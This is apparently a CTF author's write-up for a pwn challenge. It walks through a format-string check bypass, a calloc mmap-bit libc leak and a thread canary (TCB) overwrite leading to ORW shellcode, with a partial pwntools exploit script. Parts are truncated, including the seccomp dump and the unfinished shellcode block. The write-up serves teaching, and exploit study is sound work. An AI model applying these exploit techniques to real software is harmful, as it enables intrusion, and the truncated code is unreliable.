## Challenge Description


`There is a secret service hidden in the depths of the binary. Get into it,  use/hack it to your own needs and don't forget to leave a feedback :P.`


[Here](https://drive.google.com/file/d/1E4mXspk2zpwOmBj1dVHKu5ibvP9sRx6V/view?usp=sharing) are the Challenge files.

## Analysis Of The Challenge Binary

The binary is standard *x86 64-bit Dynamic stripped* executable. Additionally , **glibc 2.31** , the loader and **libseccomp** has been provided so that there are no heap mismatches later.

Here's the output of checksec - 

```sh
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

```

Here's the seccomp dump.

 0033: 0x06 0x00 0x00 0x00000000  return KILL

```

A few syscalls among openat , read and write have been left open intending for an **orw** shellcode in the end. But , there are seccomp contraints which let you read only from fd **0** and write only to fd **1**. There are simple ways to pass them which we'll see towards the end of this post.

## Reversing And Exploit Development

The binary initially asks for a `name` and an unsigned int `Age`. Before all this , it initially `mmaps` a writeable region and then calls a function which generates a random 2 byte constraint.

```c
void get_rand(long *region)
{
    time_t toc;
    unsigned int tic = time(&toc),end_t;
    do{
    srand(tic/60);
    unsigned int lower = 0x1000 , upper = 0xffff;
    unsigned int rand_num = (rand()%(upper-lower+1)) + lower;
    unsigned int delay = rand()%300 + 1;
    end_t = tic + delay;
    tic = tic + delay;
    srand(end_t/30);
    unsigned int rand_num_2 = (rand()%(upper-lower+1)) + lower;
    memset(region,0,4);
    memcpy(region,&rand_num_2,2);
    *(long *)region &= (unsigned long)rand_num;
    }
    while(*(long *)region<0x1000);
    MProtect(region);
}

```

We create a random 2 byte vulnerable contraint.

Finally the mmaped region is mprotected to be `read-only`. 

Later on , the age is verified with the 2 byte contraint which has to be satisfied by the format string vulnerability.


### An Unintended Flaw

The only thing I forgot to do was add a check to age (< 0x900) , so that only format string can be used to bypass the check to enter the secret service. 

But since I didn't add a check,  the format string is rendered **useless** as participants can directly calculate the age from the library using **ctypes** or plain python and give that as age :(.
{: .notice}

But now I'd like to discuss how you could do it the intended way using format string.

Well , I've included the fixed binary in the handout folder and now u can try the challenges without any unintended flaws :).

### The Intended Way To Get Into The Secret Service

Here's the exploit snippet which mimics the 2 byte contraint.

```python
from pwn import *
import ctypes
from ctypes import *
from time import sleep
import sys

context.arch="amd64"
HOST = '35.245.143.0'
PORT = 7777
LIBC = ELF("./libc.so.6",checksec = False)
libc = ctypes.cdll.LoadLibrary("./libc.so.6")
context.noptrace=True
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
else:
    io=process('./chall')

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)


#Defining functions for various heap operations

def add(idx,size,data):
    sla(">> ",'1')
    sla("Index : ",str(idx))
    sla("size : ",str(size))
    sa("details -> \n",data)

def view(idx):
    sla(">> ",'2')
    sla("Candidate: ",str(idx))

def hack(idx):
    sla(">> ",'2020')
    sla("Candidate: ",str(idx))

def free(idx):
    sla(">> ",'3')
    sla("Candidate: ",str(idx))

def move_on():
    sla(">> ",'4')

#Mimicing the random function implemented by binary to break it
def get_rand():
    toc = c_long()
    tic = libc.time(byref(toc))
    while True:
        libc.srand(tic/60)
        lower = 0x1000
        upper = 0xffff
        rand_num = libc.rand()%(upper-lower+1) + lower
        delay = libc.rand()%300 + 1
        end_time = tic + delay
        tic = tic + delay
        libc.srand(end_time/30)
        rand_num_2 = libc.rand()%(upper-lower+1) + lower
        region = rand_num & rand_num_2
        if(region>0x1000):
            return region

```

Now that we have calculated the age , we need to somehow overwrite the age pointer with this so that we pass the check.

### Triggering The Format String Bug

You can think of directly overwriting the age pointer with the afore calculated random number , but the issue is , I had added checks for directly not allowing numbers greater than `0x900` to be present in the input string.

```c
//%n is allowed in format string , but u cant write large numbers (greater than 0x900) with %n
void check_num(char *p)
{
    while (*p) 
    { 
        if ( isdigit(*p)) 
        {
            long val = strtol(p, &p, 10); 
            if(val>0x900)
            {
                puts("Not allowed");
                Exit();
            }
        } 
        else
            p++;
    }
    return;
}

```

So it only leaves us with the solution of writing the random number on stack and then copying it from there to the age pointer.

We can copy numbers from stack using `%*offset$d`. Let's use it in our exploit.
{: .notice}

```python

if __name__=="__main__":

    region = get_rand()
    log.info("region = " + hex(region))
    #Using format string to pass the initial check , to enter the secret_service
    payload = ('%*18$d' + '%15$n').ljust(16,'a') + p64(region)
    sa("Name: ",payload)
    sla("Age: ","123")
    sleep(1)


```

With this , we satisfy all checks and enter the secret service.

The secret service is pretty much a commonplace menu driven code with `Enroll` , `View` , `Remove` and an extra functionality which I termed as `Hack`. Later on , a feedback is requested which initialises a separate thread to do stuff.

But why so much obfuscation just to take a feedback , there's a reason for that guys, hold your horses.

```c
void secret_service()
{
    
    pthread_t t1;
    while(1)
    {
        unsigned int option = menu();
        switch(option)
        { 
            case 1: Enroll();
            break;
            case 2: View();
            break;
            case 3: Remove();
            break;
            case 4: goto Move_On;
            break;
            case 2020: Hack();
            break;
            case 5: exit(EXIT_SUCCESS);
        }
    }
    Move_On:
    puts("Do u want to leave a feedback for the service?(y/n)");
    scanf("%c",&ch);
    if(!strcmp(&ch,"y"))
    {
        pthread_create(&t1,NULL,thread_entry,NULL);
        pthread_join(t1,NULL);
    }
    else
    {
        puts("Thank you!");
    }
    exit(EXIT_SUCCESS);
}
```

Let's see how we can hack the secret service before getting into the feedback part.

1. The `Enroll` Function

```c
//Enroll with the use of safe calloc
void Enroll()
{
    if(enrolled<=2)
    {
        printf("Enter Enrollment Index : ");
        unsigned int index = getInt(),size; 
        if(is_enrolled[index] || index < 0 || index > 2)
        {
            puts("Invalid or already enrolled!");
            return;
        }
        printf("Enter size : ");
        size = getInt();
        if(size<0x7f || size>=65530)
        {
            puts("Size not allowed!");
            Exit();
        }
        sizes[index] = size;
        puts("Enter your details -> ");
        char *details = (char *)calloc(sizes[index],1);
       // printf("Allocation happened at -> %llx\n",details); Debug info , dont mind
        getInp(details,sizes[index]);
        enrolled_table[index] = details;
        is_enrolled[index] = 1;
        enrolled++;
        puts("Ok! You are enrolled now");
        return;
    }
    else
    {
        puts("No more enrollments allowed!");
    }
}


```

More or less, you can presume that it is safe.


2. The `view` Function

```c
void View()
{
    printf("Enter index of the Enrolled Candidate: ");
    unsigned int index = getInt();
    if(!enrolled_table[index] || !is_enrolled[index] || index<0 || index > 2)
    {
        puts("Invalid Index!");
        return;
    }
    //printf("Viewing chunk %llx\n",enrolled_table[index]);
    printf("Details of Candidate %u: %s\n",index,enrolled_table[index]);
    return;
}

```

There's no use `view-after-free` with all those checks in plain sight.

3. The `Hack` function

```c
void Hack()
{
    if(hacked>1)
    {
        puts("No more hacking allowed!");
        return;
    }
    printf("Enter index of Enrolled Candidate: ");
    unsigned int index = getInt();
    if(!enrolled_table[index] || index<0 || index > 2)      
    {                                  
        puts("Invalid Index!");        
        return;                        
    }
    char* hack_addr = enrolled_table[index] - 8;
    //printf("Hacking chunk %llx\n",hack_addr);
    *(hack_addr) +=1;
    hacked++;
    return;
}

```

Well this function is obviously vulnerable as the name suggests

+ It lets you hack a free chunk.
+ It lets you add **1** to the size of any chunk (free/allocated) but only twice in the whole program.

So what can we do with this? 

If we can add **2** to the size of a free chunk , we end up setting the `mmap-bit` of the free chunk , and thus we can fool calloc to return an uninitialized piece of memory. 
{: .notice}

What this means is that , calloc considers the chunk to be mapped chunk and thus does not call `memset` internally and this sets up our libc leak.

3. The `Remove` function

```c
//Remove function , nulls out the is_enrolled bit , but doesnt null out the table
void Remove()
{
    printf("Enter index of Enrolled Candidate: ");
    unsigned int index = getInt();
    if(!enrolled_table[index] || !is_enrolled[index] || index<0 || index > 2)
    {
        puts("Invalid Index");
        return;
    }
    //printf("Removing chunk %llx\n",enrolled_table[index]);
    if(enrolled_table[index])
        free(enrolled_table[index]);
    is_enrolled[index]=0;
    enrolled--;
    return;
}
```

As you can see , the remove function doesn't null out the table , which lets us `hack` free chunks.

Now let's finish up the exploit until leaking libc.

Getting leaks with this information in hand is nothing but a trivial task.

```python

    #Add 2 chunks ,one of which is uneffected by tcache
    add(0,0x600,'b'*0x40)
    add(1,0x80,'a'*0x40)
    #Free first one to send to unsorted bin
    free(0)
    #Send the unsorted bin to large bin
    add(2,0x1260,'unsorted bin')
    #Flip the bit to make the free chunk mapped , which could be used for leaking with calloc
    hack(0)
    hack(0)
    #Now add that chunk to get uninitialised memory from calloc
    add(0,0xd10,'d'*8) #0x10f0
    #view it to leak stuff
    view(0)
    #Leaks
    io.recvuntil("d"*8)
    libc_base = u64(re(6) + '\x00'*2) - 0x1ec1e0
    log.info("libc_base = "+ hex(libc_base))
    #Done with leaks , move on
```

After getting libc leak , there's not much you can do with the secret service , so , just move on :P.

### The Final Feedback

We have entered the final stage of our program (and exploit too :P) , where we are requested to enter some feedback.

A separate thread is created which calls the thread handler function, `create_feedback`.

```c
void *thread_entry(void *arg)
{
    create_feedback();
    return (void *)NULL;
}

//Create a new thread to handle feedback request
void create_feedback()
{
    char feedback[100];
    puts("A new thread has been created for feedback");
    if((unsigned long)&feedback < init_0())
    {
        printf("Enter size of feedback: ");
        scanf("%d",&size);
        printf("Enter feedback: ");
        if(size>0x70)
        {
            puts("Size too large");
            Exit();
        }
        unsigned int fd_stdout = supress_stdout();
        unsigned int fd_stderr = supress_stderr();
        get_inp(feedback,size);
    }
    puts("Thank you!");
    return;
}

```

There's a plain integer overflow as there is no check for size being less than zero and size is `int`.

But there's a canary , how do we bypass it?

So here's the thing , we are getting write over a region known as `Thread Control Block`. This is the place from where canary is actually loaded into the fs segment register for the stack check fail.
{: .notice}

Now we have plain overflow and we can assume there's no canary , cool isn't it?

Well what next?

### ROP And Shellcode To Grab That Flag

The first thing that comes to mind is , call mprotect on the region we have overflow , and then shellcode.
Well , thats it.

Let's script it till there.

```python
    move_on()
    gdb.attach(io)
    sla("service?(y/n)\n",'y')
    #Trigger integer overflow with type confusion bug to get large write on stack
    sla("feedback: ",'-1')

```

But as you would have noticed , a weird function `supress_stdout` is being called which redirects stdout to `/dev/null`. So how do we get around it? Simple , you just have to mimic it.

Now all we have to do is , write a simple shellcode. 

Wait , one more thing , what about those seccomp constraints which let you read only from fd `0` and write only to fd `1`.

1. To open flag at fd `0` , just close fd 0 and open flag , it will open at fd **0** itself.
2. Now you can read the flag at fd **0** and write it to stdout.


Here's the remaining script.


```python
    #The shellcode first reopens stdout by mimicing the mechanism of supress_stdout function
    #It does so by calling dup2 , changing file descriptor of stdout back to 1
    #Then we close stdin so that flag gets opened at fd 0.
    #After that , we call openat syscall to open flag at fd 0, as open is not allowed
    #Finally we read flag in memory and write it out
    shellcode = asm('''

## Conclusion

I have to give credits to `kileak` from [OpenToAll](https://twitter.com/OpenToAllCTF) for pointing out the unintended solution to my challenge , much appreciated.

### Flag

Here's the flag

**FLAG**: `inctf{wh3r3_d1d_y0u_l4nd_up_f1nally_st4ck_H34p_st4ck_0r_H34p_1963290327101999}`

All in all , I had lot of fun making the challenge which was intended to teach the participants about 3 vulnerabilities -

1. Tricky Format String.
2. Leaking memory from calloc.
3. TCB overwrite.

Here's the exploit script [exp.py](https://gist.github.com/PwnVerse/eaec3712c0dfbf136a8ae628cfe2655a)
